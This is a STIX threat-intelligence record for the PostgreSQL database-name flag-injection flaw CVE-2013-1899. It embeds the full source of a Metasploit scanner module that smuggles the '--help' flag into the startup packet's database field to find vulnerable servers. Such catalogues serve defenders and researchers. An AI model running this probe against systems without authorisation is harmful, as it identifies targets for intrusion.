{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fded35c2-cb6d-4e0d-bce5-2a505a642967",
    "created": "2024-08-14T16:31:22.458555Z",
    "modified": "2024-08-14T16:31:22.458558Z",
    "name": "PostgreSQL Database Name Command Line Flag Injection",
    "description": " This module can identify PostgreSQL 9.0, 9.1, and 9.2 servers that are",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/postgres/postgres_dbname_flag_injection.rb",
            "external_id": "postgres_dbname_flag_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1899"
        },
        {
            "source_name": "reference",
            "url": "https://www.postgresql.org/support/security/faq/2013-04-04/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  # Creates an instance of this module.\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PostgreSQL Database Name Command Line Flag Injection',\n      'Description'    => %q{\n        This module can identify PostgreSQL 9.0, 9.1, and 9.2 servers that are\n        vulnerable to command-line flag injection through CVE-2013-1899. This\n        can lead to denial of service, privilege escalation, or even arbitrary\n        code execution.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-1899' ],\n          [ 'URL', 'https://www.postgresql.org/support/security/faq/2013-04-04/' ]\n        ]\n    ))\n\n    register_options([ Opt::RPORT(5432) ])\n  end\n\n  def run_host(ip)\n\n    request =\n      \"\\x00\\x03\\x00\\x00\" +\n      \"user\\x00\" +\n      Rex::Text.rand_text_alpha(rand(4)+4) + \"\\x00\" +\n      \"database\\x00\" +\n      \"--help\\x00\" +\n      \"application_name\\x00\" +\n      Rex::Text.rand_text_alpha(rand(4)+4) + \"\\x00\\x00\"\n\n    connect\n\n    probe = [request.length + 4].pack(\"N\") + request\n\n    sock.put(probe)\n    resp = sock.get_once(-1, 5)\n\n    if resp.to_s =~ /process_postgres_switches/\n      proof = resp[4, resp.length-4].to_s.gsub(\"\\x00\", \" \")\n\n      print_good(\"#{rhost}:#{rport} is vulnerable to CVE-2013-1899: #{proof}\")\n      report_vuln({\n        :host\t=> rhost,\n        :port\t=> rport,\n        :proto  => 'tcp',\n        :sname  => 'postgres',\n        :name\t=> self.name,\n        :info\t=> \"Vulnerable: \" + proof,\n        :refs   => self.references\n      })\n    elsif resp.to_s =~ /pg_hba\\.conf/\n      print_error(\"#{rhost}:#{rport} does not allow connections from us\")\n    else\n      print_status(\"#{rhost}:#{rport} does not appear to be vulnerable to CVE-2013-1899\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ hdm ]",
        ""
    ]
}